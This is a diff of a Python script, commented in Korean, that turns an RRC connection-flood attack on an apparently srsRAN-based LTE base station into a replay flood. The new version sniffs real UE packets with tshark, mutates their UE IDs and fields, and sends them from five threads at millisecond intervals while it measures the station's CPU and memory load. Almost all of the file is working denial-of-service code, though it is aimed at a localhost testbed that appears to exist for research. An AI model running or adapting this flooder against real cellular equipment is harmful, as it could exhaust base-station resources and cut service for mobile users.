@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 """
-RRC Connection Flood Attack
-RRC 연결 과정을 반복하여 eNB의 연결 관리 리소스를 고갈시키는 공격
+실제 UE 패킷 형식을 사용한 플러딩 공격
+실제 UE가 보내는 RRC 메시지 형식을 그대로 복사해서 사용
 """
 
 import zmq
-import struct
 import time
 import threading
 import random
@@ -14,7 +13,7 @@ import os
 import re
 from datetime import datetime
 
-class RRCConnectionFlood:
+class RealUEFlood:
     def __init__(self, target_port=2001):
         self.target_port = target_port
         self.context = zmq.Context()
@@ -27,9 +26,12 @@ class RRCConnectionFlood:
         self.start_time = None
         self.start_stats = None
         self.end_stats = None
-    
+        
+        # 실제 UE 패킷 저장소
+        self.real_packets = {}
+        
     def get_system_stats(self):
-        """시스템 리소스 통계 수집 (psutil 없이 시스템 명령어 사용)"""
+        """시스템 리소스 통계 수집"""
         try:
             stats = {
                 'timestamp': datetime.now().isoformat(),
@@ -42,7 +44,7 @@ class RRCConnectionFlood:
                 'srsran_memory': 0
             }
             
-            # CPU 사용량 (top 명령어 사용)
+            # CPU 사용량
             try:
                 result = subprocess.run(['top', '-l', '1', '-n', '0'], 
                                       capture_output=True, text=True, timeout=5)
@@ -54,11 +56,11 @@ class RRCConnectionFlood:
             except:
                 pass
             
-            # 메모리 사용량 (vm_stat 명령어 사용)
+            # 메모리 사용량
             try:
                 result = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)
                 lines = result.stdout.split('\n')
-                page_size = 4096  # 기본 페이지 크기
+                page_size = 4096
                 total_pages = 0
                 free_pages = 0
                 
@@ -81,7 +83,7 @@ class RRCConnectionFlood:
             except:
                 pass
             
-            # 네트워크 트래픽 (netstat 명령어 사용)
+            # 네트워크 트래픽
             try:
                 result = subprocess.run(['netstat', '-ib'], capture_output=True, text=True, timeout=5)
                 lines = result.stdout.split('\n')
@@ -89,12 +91,12 @@ class RRCConnectionFlood:
                 bytes_recv = 0
                 
                 for line in lines:
-                    if 'en0' in line or 'en1' in line:  # 이더넷 인터페이스
+                    if 'en0' in line or 'en1' in line:
                         parts = line.split()
                         if len(parts) >= 10:
                             try:
-                                bytes_sent += int(parts[6])  # obytes
-                                bytes_recv += int(parts[9])  # ibytes
+                                bytes_sent += int(parts[6])
+                                bytes_recv += int(parts[9])
                             except:
                                 pass
                 
@@ -103,7 +105,7 @@ class RRCConnectionFlood:
             except:
                 pass
             
-            # srsRAN 프로세스 리소스 (ps 명령어 사용)
+            # srsRAN 프로세스 리소스
             try:
                 result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=5)
                 lines = result.stdout.split('\n')
@@ -113,8 +115,8 @@ class RRCConnectionFlood:
                         parts = line.split()
                         if len(parts) >= 11:
                             try:
-                                cpu = float(parts[2])  # CPU 사용률
-                                memory = float(parts[3])  # 메모리 사용률
+                                cpu = float(parts[2])
+                                memory = float(parts[3])
                                 stats['srsran_cpu'] += cpu
                                 stats['srsran_memory'] += memory
                             except:
@@ -144,138 +146,142 @@ class RRCConnectionFlood:
             os.makedirs(self.log_dir)
         
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        log_filename = f"{self.log_dir}/rrc_connection_flood_{attack_type}_{timestamp}.log"
+        log_filename = f"{self.log_dir}/real_ue_flood_{attack_type}_{timestamp}.log"
         
         self.log_file = open(log_filename, 'w', encoding='utf-8')
-        self.log_message(f"=== RRC Connection Flood Attack 로그 시작 ===")
+        self.log_message(f"=== Real UE Flood Attack 로그 시작 ===")
         self.log_message(f"공격 유형: {attack_type}")
         self.log_message(f"지속 시간: {duration}초")
         self.log_message(f"로그 파일: {log_filename}")
         self.log_message("=" * 50)
-        
-    def create_rrc_connection_request(self, ue_id):
-        """RRC Connection Request 메시지 생성 (srsRAN 호환 형식)"""
-        # srsRAN이 실제로 처리하는 메시지 형식
-        message = struct.pack('>H', 0x0001)  # Message Type: RRC Connection Request
-        message += struct.pack('>I', ue_id)   # UE Identity
-        message += struct.pack('>H', 0x0001)  # Establishment Cause: Mobile originating call
-        message += struct.pack('>H', 0x0000)  # Spare
-        
-        # srsRAN이 기대하는 실제 RRC 필드들
-        message += struct.pack('>I', 0x12345678)  # RRC Transaction ID
-        message += struct.pack('>H', 0x0000)       # Criticality
-        message += struct.pack('>H', 0x0000)       # Spare
-        
-        # 복잡한 UE 정보 추가 (처리 부담 증가)
-        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
-        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
-        message += struct.pack('>H', random.randint(1, 65535))  # LAI
-        message += struct.pack('>B', random.randint(1, 255))  # RRC State
-        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
-        message += struct.pack('>H', random.randint(1, 65535))  # Tracking Area Code
-        
-        # 추가 복잡한 필드들 (더 많은 처리 부담)
-        for i in range(50):  # 메시지 크기 증가
-            message += struct.pack('>I', random.randint(1, 1000000))  # 추가 필드들
-        
-        # 더 큰 페이로드 추가 (메모리 사용량 증가)
-        large_payload = b'X' * 1000  # 1KB 페이로드
-        message += large_payload
-        
-        return message
     
-    def create_rrc_connection_setup_complete(self, ue_id):
-        """RRC Connection Setup Complete 메시지 생성"""
-        message = struct.pack('>H', 0x0003)  # Message Type: RRC Connection Setup Complete
-        message += struct.pack('>I', ue_id)  # UE Identity
-        message += struct.pack('>H', 0x0000)  # Spare
+    def capture_real_ue_packets(self, duration=10):
+        """실제 UE 패킷 캡처"""
+        self.log_message("=== 실제 UE 패킷 캡처 시작 ===")
+        self.log_message("UE를 사용해서 RRC 메시지를 보내주세요...")
         
-        # NAS 메시지 포함 (추가 처리 부담)
-        message += struct.pack('>B', 0x41)  # NAS Message Type: Attach Request
-        message += struct.pack('>Q', random.randint(1000000000000000, 9999999999999999))  # IMSI
-        message += struct.pack('>I', random.randint(1, 1000000))  # TMSI
-        message += struct.pack('>H', random.randint(1, 65535))  # LAI
-        
-        return message
+        try:
+            cmd = [
+                "sudo", "tshark", 
+                "-i", "any",
+                "-f", "port 2001",
+                "-T", "fields",
+                "-e", "data"
+            ]
+            
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=duration)
+            
+            if result.returncode == 0:
+                self.parse_captured_packets(result.stdout)
+                return True
+            else:
+                self.log_message(f"패킷 캡처 실패: {result.stderr}")
+                return False
+                
+        except subprocess.TimeoutExpired:
+            self.log_message("캡처 시간 초과")
+            return False
+        except Exception as e:
+            self.log_message(f"캡처 오류: {e}")
+            return False
     
-    def create_rrc_connection_release_request(self, ue_id):
-        """RRC Connection Release Request 메시지 생성"""
-        message = struct.pack('>H', 0x0004)  # Message Type: RRC Connection Release Request
-        message += struct.pack('>I', ue_id)  # UE Identity
-        message += struct.pack('>H', 0x0000)  # Spare
+    def parse_captured_packets(self, output):
+        """캡처된 패킷 파싱"""
+        lines = output.strip().split('\n')
+        packet_count = 0
         
-        # Release Cause (복잡한 원인)
-        message += struct.pack('>B', random.randint(1, 10))  # Release Cause
-        message += struct.pack('>I', random.randint(1, 1000000))  # Cell ID
+        for line in lines:
+            if not line.strip():
+                continue
+                
+            # 16진수 데이터 파싱
+            hex_data = line.replace(':', '').replace(' ', '')
+            if len(hex_data) >= 4:  # 최소 2바이트
+                try:
+                    packet_bytes = bytes.fromhex(hex_data)
+                    
+                    # RRC 메시지 타입 추출
+                    if len(packet_bytes) >= 2:
+                        message_type = int.from_bytes(packet_bytes[:2], 'big')
+                        
+                        if message_type not in self.real_packets:
+                            self.real_packets[message_type] = []
+                        
+                        self.real_packets[message_type].append(packet_bytes)
+                        packet_count += 1
+                        
+                except ValueError:
+                    continue
         
-        return message
+        self.log_message(f"캡처된 패킷: {packet_count}개")
+        self.log_message(f"메시지 타입: {list(self.real_packets.keys())}")
     
-    def send_message(self, message, message_type):
+    def generate_attack_packets(self):
+        """공격용 패킷 생성"""
+        attack_packets = []
+        
+        for msg_type, packets in self.real_packets.items():
+            self.log_message(f"메시지 타입 0x{msg_type:04X}: {len(packets)}개 패킷")
+            
+            # 가장 긴 패킷을 기준으로 사용
+            base_packet = max(packets, key=len)
+            
+            # 다양한 UE ID로 변형 생성
+            for ue_id in range(1000, 1100):  # 100개 UE
+                attack_packet = bytearray(base_packet)
+                
+                # UE ID 변경 (패킷 구조에 따라)
+                if len(attack_packet) >= 6:
+                    attack_packet[2:6] = ue_id.to_bytes(4, 'big')
+                
+                # 일부 필드 랜덤화
+                for i in range(10, min(len(attack_packet), 50)):
+                    attack_packet[i] = (attack_packet[i] + ue_id) % 256
+                
+                attack_packets.append(bytes(attack_packet))
+        
+        self.log_message(f"생성된 공격 패킷: {len(attack_packets)}개")
+        return attack_packets
+    
+    def send_message(self, message, description):
         """메시지 전송"""
         try:
             socket = self.context.socket(zmq.PUSH)
-            socket.connect(f'tcp://localhost:{self.target_port}')
-            
+            socket.connect(f"tcp://localhost:{self.target_port}")
             socket.send(message, zmq.NOBLOCK)
-            print(f"[{datetime.now().strftime('%H:%M:%S')}] {message_type}: {len(message)} bytes")
-            
             socket.close()
+            self.log_message(f"전송: {description} ({len(message)} bytes)")
             return True
-            
         except Exception as e:
-            print(f"메시지 전송 오류: {e}")
+            self.log_message(f"전송 실패: {description} - {e}")
             return False
     
-    def rrc_connection_cycle(self, ue_id, duration=60):
-        """RRC 연결 사이클 공격"""
+    def flooding_attack(self, attack_packets, duration):
+        """플러딩 공격"""
         start_time = time.time()
-        cycle_count = 0
+        sent_count = 0
         
         while self.running and (time.time() - start_time) < duration:
             try:
-                # 1단계: RRC Connection Request
-                rrc_request = self.create_rrc_connection_request(ue_id)
-                self.send_message(rrc_request, f"RRC Connection Request #{cycle_count}")
-                time.sleep(0.1)
+                # 랜덤 패킷 선택
+                packet = random.choice(attack_packets)
                 
-                # 2단계: RRC Connection Setup Complete
-                rrc_complete = self.create_rrc_connection_setup_complete(ue_id)
-                self.send_message(rrc_complete, f"RRC Connection Setup Complete #{cycle_count}")
-                time.sleep(0.1)
+                # 전송
+                if self.send_message(packet, f"Real UE Flood #{sent_count}"):
+                    sent_count += 1
                 
-                # 3단계: RRC Connection Release Request
-                rrc_release = self.create_rrc_connection_release_request(ue_id)
-                self.send_message(rrc_release, f"RRC Connection Release Request #{cycle_count}")
-                
-                cycle_count += 1
-                time.sleep(0.01)  # 다음 사이클까지 대기 (강도 증가)
+                time.sleep(0.001)  # 매우 짧은 간격
                 
             except Exception as e:
-                print(f"RRC 연결 사이클 오류: {e}")
+                self.log_message(f"플러딩 공격 오류: {e}")
                 time.sleep(1)
-    
-    def flooding_attack(self, num_ues=100, duration=60):
-        """플러딩 공격 (다수 UE 동시 공격)"""
-        start_time = time.time()
         
-        while self.running and (time.time() - start_time) < duration:
-            try:
-                # 다수 UE가 동시에 RRC Connection Request 전송
-                for ue_id in range(num_ues):
-                    rrc_request = self.create_rrc_connection_request(1000 + ue_id)
-                    self.send_message(rrc_request, f"Flooding UE {ue_id}")
-                    time.sleep(0.001)  # 매우 짧은 간격
-                
-                time.sleep(0.01)  # 다음 라운드까지 대기 (강도 증가)
-                
-            except Exception as e:
-                print(f"플러딩 공격 오류: {e}")
-                time.sleep(1)
+        self.log_message(f"총 전송된 메시지: {sent_count}개")
     
-    def start_attack(self, attack_type="cycle", num_ues=10, duration=60):
+    def start_attack(self, duration=60):
         """공격 시작"""
         # 로그 설정
-        self.setup_logging(attack_type, duration)
+        self.setup_logging("real_ue", duration)
         
         # 시작 시 리소스 통계 수집
         self.start_time = datetime.now()
@@ -291,43 +297,32 @@ class RRCConnectionFlood:
             self.log_message(f"srsRAN 메모리: {self.start_stats['srsran_memory']:.1f}%")
             self.log_message("=" * 50)
         
-        self.log_message(f"=== RRC Connection Flood Attack 시작 ===")
-        self.log_message(f"공격 유형: {attack_type}")
-        self.log_message(f"UE 수: {num_ues}")
+        self.log_message(f"=== Real UE Flood Attack 시작 ===")
         self.log_message(f"지속 시간: {duration}초")
         self.log_message(f"대상 포트: {self.target_port}")
         self.log_message("=" * 50)
         
+        # 실제 UE 패킷 캡처
+        if not self.capture_real_ue_packets(10):
+            self.log_message("실제 UE 패킷 캡처 실패 - 기본 패킷 사용")
+            # 기본 패킷 생성
+            self.real_packets[0x0001] = [b'\x00\x01' + b'\x00' * 50]
+        
+        # 공격 패킷 생성
+        attack_packets = self.generate_attack_packets()
+        
+        if not attack_packets:
+            self.log_message("공격 패킷 생성 실패")
+            return
+        
         self.running = True
         
-        if attack_type == "cycle":
-            # RRC 연결 사이클 공격 - 강도 증가
-            for i in range(5):  # 5개 스레드로 동시 공격
-                thread = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
-                thread.daemon = True
-                thread.start()
-                self.attack_threads.append(thread)
-            
-        elif attack_type == "flooding":
-            # 플러딩 공격 - 강도 증가
-            for i in range(3):  # 3개 스레드로 동시 플러딩
-                thread = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
-                thread.daemon = True
-                thread.start()
-                self.attack_threads.append(thread)
-            
-        elif attack_type == "mixed":
-            # 혼합 공격
-            thread1 = threading.Thread(target=self.rrc_connection_cycle, args=(1000, duration))
-            thread2 = threading.Thread(target=self.flooding_attack, args=(num_ues, duration))
-            
-            thread1.daemon = True
-            thread2.daemon = True
-            
-            thread1.start()
-            thread2.start()
-            
-            self.attack_threads.extend([thread1, thread2])
+        # 플러딩 공격 스레드 시작
+        for i in range(5):  # 5개 스레드로 동시 공격
+            thread = threading.Thread(target=self.flooding_attack, args=(attack_packets, duration))
+            thread.daemon = True
+            thread.start()
+            self.attack_threads.append(thread)
         
         # 공격 지속 시간 대기
         time.sleep(duration)
@@ -380,22 +375,20 @@ class RRCConnectionFlood:
 def main():
     import argparse
     
-    parser = argparse.ArgumentParser(description='RRC Connection Flood Attack')
-    parser.add_argument('--attack-type', choices=['cycle', 'flooding', 'mixed'], 
-                       default='cycle', help='공격 유형')
-    parser.add_argument('--num-ues', type=int, default=10, help='UE 수')
+    parser = argparse.ArgumentParser(description='Real UE Flood Attack')
     parser.add_argument('--duration', type=int, default=60, help='공격 지속 시간 (초)')
     parser.add_argument('--target-port', type=int, default=2001, help='대상 포트')
     
     args = parser.parse_args()
     
-    attack = RRCConnectionFlood(args.target_port)
+    print("=== Real UE Flood Attack ===")
+    print("실제 UE 패킷 형식을 사용한 플러딩 공격")
+    print(f"지속 시간: {args.duration}초")
+    print(f"대상 포트: {args.target_port}")
+    print()
     
-    try:
-        attack.start_attack(args.attack_type, args.num_ues, args.duration)
-    except KeyboardInterrupt:
-        print("\n사용자에 의해 중단됨")
-        attack.stop_attack()
+    attack = RealUEFlood(args.target_port)
+    attack.start_attack(args.duration)
 
 if __name__ == "__main__":
     main()
